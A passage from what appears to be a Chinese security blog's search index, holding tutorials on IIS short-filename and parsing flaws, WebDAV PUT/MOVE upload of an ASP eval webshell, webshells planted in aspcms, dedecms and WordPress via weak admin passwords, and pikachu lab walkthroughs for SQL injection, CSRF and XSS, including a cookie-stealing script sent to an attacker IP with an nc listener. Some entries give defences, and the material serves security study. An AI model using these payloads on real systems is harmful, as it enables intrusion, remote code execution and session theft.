class="line">http://upload.moonteam.com/abcde*~1*/a.aspx</span><br></pre></td></tr></table></figure><p>到这文件名已经出来了，接着就是判断是目录还是文件。</p><p><img src="https://pic.888888.al/i/2023/08/15/z6odsm.png" alt="10"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1/a.aspx</span><br><span class="line"></span><br><span class="line">````</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![11](https://pic.888888.al/i/2023/08/15/z7phjg.png)</span><br><span class="line">判断是文件 按照a-z进行测试 404表示存在 400表示不存在 第一个字符不是a开头的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```asp</span><br><span class="line">http://upload.moonteam.com/abcde*~1.a*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z8vxft.png" alt="12"><br>.</p><p>.</p><p>.</p><p>第一个是字符是t开头的，接着往后测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.t*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z90b4e.png" alt="13"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.txt*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z9f8xj.png" alt="14"></p><p>按照上面的方法依次猜解得到该短文件名的后缀是txt 短文件名为 abcde~1.txt 可以接着猜解<br>abcde1231111.txt文件名</p><p>.</p><p><strong>使用IIS短文件名扫描软件，获取目标存在哪些短文件名</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis_shortname_Scan.py http://upload.moonteam.com/</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z9lo7o.png" alt="15"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、升级.net framework</p><p>2、修改注册表键值：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem<br>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p><p>命令行关闭 fsutil behavior set disable8dot3 1</p><p>新建文件 aaaaaaaaaaaaaazzzzz.txt 已经没有短文件名了。<br><img src="https://pic.888888.al/i/2023/08/15/z9yj6p.png" alt="16"><br>**注:**此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消<br>失。如果不重新复制，已经存在的短文件名则是不会消失的。</p><p>将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到<br>c:\www。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS文件解析漏洞</title>
+      <link href="/archives/e735aa4d.html"/>
+      <url>/archives/e735aa4d.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h1><h2 id="1-基于文件名"><a href="#1-基于文件名" class="headerlink" title="1 基于文件名"></a>1 基于文件名</h2><h3 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h3><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 <strong>;</strong> 号及其后面的内容，相当于截断。</p><p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p><p><strong>iis6.0-&gt;主目录-&gt;配置 查看 这几种扩展名都是指向同一个文件</strong></p><p><strong>C:\WINDOWS\system32\inetsrv\asp.dll 所以都解析成asp</strong><br><img src="https://pic.888888.al/i/2023/08/15/z1p221.png" alt="0"></p><h3 id="1-2复现"><a href="#1-2复现" class="headerlink" title="1.2复现"></a>1.2复现</h3><p>通过文件上传，或者创建文件，格式为*.asp;.jpg<br><img src="https://pic.888888.al/i/2023/08/15/z1thtx.png" alt="1"></p><h3 id="1-3防御"><a href="#1-3防御" class="headerlink" title="1.3防御"></a>1.3防御</h3><p><strong>1.禁止创建和上传此类畸形文件</strong></p><p><strong>2.图片存放目录设置成禁止脚本文件执行</strong></p><p><strong>3.升级iis版本</strong></p><h2 id="2-基于文件夹"><a href="#2-基于文件夹" class="headerlink" title="2 基于文件夹"></a>2 基于文件夹</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>该版本默认将 *.asp&#x2F; 目录下的所有文件当成Asp解析。</p><h3 id="2-2复现"><a href="#2-2复现" class="headerlink" title="2.2复现"></a>2.2复现</h3><p>创建文件.asp文件夹 上传图片格式后门到此目录<br><img src="https://pic.888888.al/i/2023/08/15/z2927b.png" alt="2"></p><h3 id="2-3防御"><a href="#2-3防御" class="headerlink" title="2.3防御"></a>2.3防御</h3><p><strong>1.禁止创建此类文件夹</strong></p><p><strong>3.升级iis版本</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS任意文件写入漏洞</title>
+      <link href="/archives/1f4414ad.html"/>
+      <url>/archives/1f4414ad.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/08/15/yurpo5.png" alt="0"><br><img src="https://pic.888888.al/i/2023/08/15/yvsx06.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/08/15/yw91o0.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/ywviuf.png" alt="3"></p><p>shell.asp写入成功。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><strong>1.关闭webdav</strong><br><strong>2.关闭写入权限</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>aspcms拿webshell</title>
+      <link href="/archives/d8c67745.html"/>
+      <url>/archives/d8c67745.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>网站中的配置文件，如果可在后台里进行修改，如果没有任何过滤，可以在里面写入而已的语句，即可<br>获取webshell。</p><p><strong>注</strong>：注意闭合问题，因为配置文件在网站中是全局调用，如果写错，网站会错误。无法访问。<br>在aspcms可以修改 如果是字符类型填写双引号闭合 如果是数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br><span class="line"><span class="string">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>一样的，通过弱口令进入到后台。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/08/15/xozg6o.jpg" alt="0"></p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>点击<strong>拓展功能-&gt;幻灯片管理</strong>，打开<strong>burpsuit</strong>进行抓包。<br><img src="https://pic.888888.al/i/2023/08/15/xqupdr.jpg" alt="1"><br>在<strong>slidestyle</strong>的后面写入一句话木马，注意闭合问题，并进行URL-encode。<br><img src="https://pic.888888.al/i/2023/08/15/xr7s2d.jpg" alt="2"><br>放包，用蚁剑尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/08/15/xraa7q.jpg" alt="3"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> webshell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dedecms后台拿webshell</title>
+      <link href="/archives/226c5523.html"/>
+      <url>/archives/226c5523.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>我们用弱口令爆破，将账号和密码穷举出来。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/08/15/xib4qz.jpg" alt="0"></p><h2 id="方法一：文件上传"><a href="#方法一：文件上传" class="headerlink" title="方法一：文件上传"></a>方法一：文件上传</h2><p>我们进入到<strong>核心-&gt;文件上传</strong>这个位置，直接上传带有木马的文件。<br><img src="https://pic.888888.al/i/2023/08/15/xie1f8.jpg" alt="1"><br><strong>上传成功!</strong><br><img src="https://pic.888888.al/i/2023/08/15/xigtsd.jpg" alt="2"></p><h2 id="方法二：修改模块文件"><a href="#方法二：修改模块文件" class="headerlink" title="方法二：修改模块文件"></a>方法二：修改模块文件</h2><p>进入<strong>模板-&gt;index.html</strong>，点击修改。<br><img src="https://pic.888888.al/i/2023/08/15/xiv4sz.jpg" alt="3"><br>加入我们的payload。<br><img src="https://pic.888888.al/i/2023/08/15/xiyr0f.jpg" alt="4"><br>修改成功后，我们到生成这个界面，将主页位置中文件的后缀改为.php，然后更新主页。<br><img src="https://pic.888888.al/i/2023/08/15/xj2gcr.jpg" alt="5"><br>点击游览，上传成功！<br><img src="https://pic.888888.al/i/2023/08/15/xks2vx.jpg" alt="6"></p><h2 id="方法三：后台任意命令执行"><a href="#方法三：后台任意命令执行" class="headerlink" title="方法三：后台任意命令执行"></a>方法三：后台任意命令执行</h2><p>在dedecms后台广告管理，可以插入php任意代码。<br><img src="https://pic.888888.al/i/2023/08/15/xkwcgk.jpg" alt="7"></p><p>点击增加一个广告位，在广告内容写入payload。<br><img src="https://pic.888888.al/i/2023/08/15/xl7skm.jpg" alt="8"></p><p>用中国菜刀尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/08/15/xla3mk.jpg" alt="9"><br><img src="https://pic.888888.al/i/2023/08/15/xldxzz.jpg" alt="10"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> webshell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>wordpress后台拿webshell</title>
+      <link href="/archives/0.html"/>
+      <url>/archives/0.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>首先我们通过弱口令爆破拿到wordpress的账号和密码。</p><p>账号：admin 密码：123456</p><p><img src="https://pic.888888.al/i/2023/08/15/xmi2lm.jpg" alt="1"></p><h2 id="方法一：模板编辑"><a href="#方法一：模板编辑" class="headerlink" title="方法一：模板编辑"></a>方法一：模板编辑</h2><p>我们到外观-&gt;编辑这个模块，选择404模板，在404.php中写入php一句话木马。</p><p>点击更新文件<br><img src="https://pic.888888.al/i/2023/08/15/xmnjje.jpg" alt="2"></p><p>我们可以看到在服务器后台的404.php文件中确实被我们写入了一句话木马了。<br><img src="https://pic.888888.al/i/2023/08/15/xmqqj4.jpg" alt="3"></p><p>我们妨问404.php并且用蚁剑尝试连接。<br><img src="https://pic.888888.al/i/2023/08/15/xn7zq3.jpg" alt="4"><br>连接成功！<br><img src="https://pic.888888.al/i/2023/08/15/xnakad.jpg" alt="5"></p><h2 id="方法二：上传主题"><a href="#方法二：上传主题" class="headerlink" title="方法二：上传主题"></a>方法二：上传主题</h2><p>我们进入到外观-&gt;主题界面，将带有木马的文件写入主题中，再上传上去。<br><img src="https://pic.888888.al/i/2023/08/15/xnm31o.jpg" alt="6"></p><p>点击上传<br><img src="https://pic.888888.al/i/2023/08/15/xno7st.jpg" alt="7"><br>妨问这个主题中带有木马的文件<br><img src="https://pic.888888.al/i/2023/08/15/xnqbfs.jpg" alt="8"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>模板编辑拿webshell</strong></p><p>通过修改模块写入一句话，网站再调用模板的时，会自动加载这个模板，运行后门。<br><strong>文件上传拿webshell</strong></p><p>通过后台的上传模块，上传网页后门，就可以拿到webshell。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> webshell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pikachu靶场通关秘籍之SQL</title>
+      <link href="/archives/c4c569e3.html"/>
+      <url>/archives/c4c569e3.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="Sql-Inject-SQL注入-介绍"><a href="#Sql-Inject-SQL注入-介绍" class="headerlink" title="Sql Inject(SQL注入)介绍"></a>Sql Inject(SQL注入)介绍</h2><pre><code>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。**一个严重的SQL注入漏洞，可能会直接导致一家公司破产！SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重! SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。  </code></pre><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>第一关，选择查询的id然后点击查询就能查询到数据，这时候我对查询进行抓包。<br><img src="https://pic.888888.al/i/2023/08/15/yqjzhi.jpg" alt="1">  </p><p>右键 <em>Send to Repeater</em><br><img src="https://pic.888888.al/i/2023/08/15/yqmjdx.jpg" alt="2">  </p><p>我们在id这块进行测试，在后面添加 or 1&#x3D;1 发现有注入点:<br><img src="https://pic.888888.al/i/2023/08/15/yqzgyv.jpg" alt="3">  </p><h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h2><p>输入想查找的东西，点击查询进行查找,这边我们直接在输入框中进行测试,和上题一样输入 <strong>lili or 1&#x3D;1#</strong>,发现有注入点：<br><img src="https://pic.888888.al/i/2023/08/15/yrj41v.jpg" alt="4"></p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>和上题一样 ，输入**lili\**破坏其内部数据库语句结构<br><img src="https://pic.888888.al/i/2023/08/15/yrtyxr.jpg" alt="5"><br><img src="https://pic.888888.al/i/2023/08/15/ys4wlk.jpg" alt="6">  </p><h2 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h2><p>这边我们点击<strong>注册</strong>，在用户栏进行注入。payload为:<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/08/15/ys9px9.jpg" alt="7"><br><img src="https://pic.888888.al/i/2023/08/15/ysc421.jpg" alt="8">  </p><h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p>这里是一个留言板，我们随便写一点东西进去，鼠标移到 <em>删除</em> 在左下角可以看到<strong>id&#x3D;60</strong>,说明我们的数据是有id头的，所以点击删除抓包。<br><img src="https://pic.888888.al/i/2023/08/15/yswjmj.jpg" alt="9"><br>我们在id&#x3D;60后面注入即可：<br><img src="https://pic.888888.al/i/2023/08/15/yszxxs.jpg" alt="10"><br><img src="https://pic.888888.al/i/2023/08/15/ytbjrq.jpg" alt="11">  </p><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p>有些时候，后台开发人员为了验证客户端头信息，比如常用的cookie验证，或者通过http请求头信息获取客户端的一些信息，比如useragent、accept字段等等，会对客户端的http请求头信息获取并使用sql进行处理，如果此时没有足够的安全考虑，则可能会导致基于http头的sql注入漏洞  </p><p>首先，我们点击 <em>点击退出</em> 抓包<br><img src="https://pic.888888.al/i/2023/08/15/ytx8da.jpg" alt="12">  </p><p>在<strong>User-Agent</strong>进行注入,payload为<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/08/15/yu0u9m.jpg" alt="13">  </p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>时间盲注主要使用if语句，通过延迟信息进行判断，不看回显信息，这里就不多说了，使用SQLMAP效果更佳，手动测试难免有误差。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pikachu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pikachu </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pikachu靶场通关秘籍之CSRF</title>
+      <link href="/archives/f3a6c1ad.html"/>
+      <url>/archives/f3a6c1ad.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="CSRF-跨站请求伪造-攻击介绍"><a href="#CSRF-跨站请求伪造-攻击介绍" class="headerlink" title="CSRF(跨站请求伪造)攻击介绍"></a>CSRF(跨站请求伪造)攻击介绍</h2><pre><code>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。场景需求：小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录---修改会员信息，提交请求---修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。 因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：--对敏感信息的操作增加安全的token；--对敏感信息的操作增加安全的验证码；--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。如果你没有读太明白,不要犹豫,请再读一遍啦  </code></pre><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>通过以上的介绍，我们知道要想构成CSRF攻击，首先得诱导受害者点击我们的网页。我们先进入到其中一个用户的内部。<br><img src="https://pic.888888.al/i/2023/08/15/vowmxm.jpg" alt="1"><br>点击修改个人信息，修改手机号，点击提交并抓包。<br><img src="https://pic.888888.al/i/2023/08/15/vp0rov.jpg" alt="2"><br>将数据包中的<strong>GET</strong>和<strong>HOTS</strong>内容保存，并创建一个简单的html网页，代码如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span> New Document <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UIF-8&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=999&amp;add=&amp;email=&amp;submit=submit HTTP/1.1&quot;</span>&gt;</span>点我抽奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图:<br><img src="https://pic.888888.al/i/2023/08/15/vu9su0.jpg" alt="3"></p><p>当用户点击 <em>点我抽奖</em> 时会触发CSRF攻击,直接修改了用户的手机号。<br><img src="https://pic.888888.al/i/2023/08/15/vue9k0.jpg" alt="4">  </p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果是POST型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击  </p><p>攻击者可以搭建一个站点，在站点上做一个表单，诱导vince点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>这里我们用Burp Suite自带的csrf功能构造一个站点:<br><img src="https://pic.888888.al/i/2023/08/15/vuu18s.jpg" alt="5"><br><img src="https://pic.888888.al/i/2023/08/15/vzsex7.jpg" alt="6"></p><p>同上面操作一样即可。  </p><h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p><strong>CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造，每次请求，都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求。</strong></p><p><strong>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了，对于token，暂时还没有什么办法通过</strong></p><p><strong>所以，使用token是一个很好的防御CSRF攻击的方法。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> pikachu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pikachu </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pikachu靶场通关秘籍之XSS</title>
+      <link href="/archives/77aee975.html"/>
+      <url>/archives/77aee975.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="跨站脚本攻击介绍"><a href="#跨站脚本攻击介绍" class="headerlink" title="跨站脚本攻击介绍"></a>跨站脚本攻击介绍</h2><p><strong>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型:</strong>  </p><pre><code>    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;  </code></pre><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可：<br><img src="https://pic.888888.al/i/2023/08/15/w543ls.jpg" alt="1">  </p><h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>先登录进去,同样在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong> 即可<br><img src="https://pic.888888.al/i/2023/08/15/w9qe68.jpg" alt="2">  </p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。  </p><p>同样在输入框中输入**&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**，当有人浏览你的留言时都会触发XSS。<br><img src="https://pic.888888.al/i/2023/08/15/w6v9u2.jpg" alt="3">  </p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>查看页面的源代码，找到输入框的位置，可以看到输入的东西在前端进行了过滤，所以只要把前面语法闭合掉，然后添加自己的语法即可,<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/w6v9u2.jpg" alt="4"><br><img src="https://pic.888888.al/i/2023/08/15/wca2cs.jpg" alt="5">  </p><h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>同上一样的方法，审查一下js就好:<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x3hn25.jpg" alt="6"><br><img src="https://pic.888888.al/i/2023/08/15/x3kut1.jpg" alt="7">  </p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><strong>盲打就是前端不会做出任何反馈，只有后台管理员知道，你写了什么，这时候我们就要利用nc反弹来获得管理员的cookie，进而可以登录到后台。</strong>  </p><p>我们用这个payload来打<strong>&lt;script&gt;var img&#x3D;document.createElement(“img”);img.src&#x3D;”http:&#x2F;&#x2F;[你的ip]:4444&#x2F;a?”+escape(document.cookie);&lt;&#x2F;script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x461q3.jpg" alt="8">  </p><p>提交完之后，我们用nc监听:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/x432fb.jpg" alt="9"><br><strong>当管理员进入后台，看到我们写的东西后，nc也就监听到了:</strong><br><img src="https://pic.888888.al/i/2023/08/15/x48n4m.jpg" alt="10">  </p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>前端对我们提交的语句进行了过滤，考虑大小写绕过 <strong>&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x4nemd.jpg" alt="11"></p><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" 